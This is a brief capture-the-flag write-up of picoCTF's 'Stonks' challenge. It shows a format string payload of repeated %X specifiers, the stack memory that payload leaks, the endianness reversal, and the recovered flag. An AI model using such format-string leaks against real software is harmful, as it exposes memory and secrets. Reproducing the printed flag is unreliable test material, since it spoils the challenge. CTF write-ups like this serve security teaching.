Challenge is 20 poins under Binary Exploitation Category.

Gives us the source code to look at, and when we run the command it tells us of a stonks buying program. When trying to buy stocks from the program, we are asked to key in the API token we have.

Based on the vuln.c file, it accepts %300s as the input, but what if we keyed in stuff that wasn't strings?

My payload was :
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X

This is what I got in return:
86BD3B0804B00080489C3F7F29D80FFFFFFFF186BB160F7F37110F7F29DC7086BC180A86BD39086BD3B06F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3534303664303664FF88007DF7F64AF8F7F3744099A7230010F7DC6BE9F7F380C0F7F295C0F7F29000FF8894A8F7DB758DF7F295C08048ECAFF8894B40F7F4BF09804B000F7F29000F7F29E20FF8894E8F7F51D50F7F2A89099A72300F7F29000804B000FF8894E8

Reversing this from hex to string reveals the flag is there but it's backwards! So we need to decipher it slowly...

After removing all the characters, I got the flag. Basically involves rotating every 4 bytes of data as it is inversed, and this is due to Endianess of a machine. 

Flag: picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
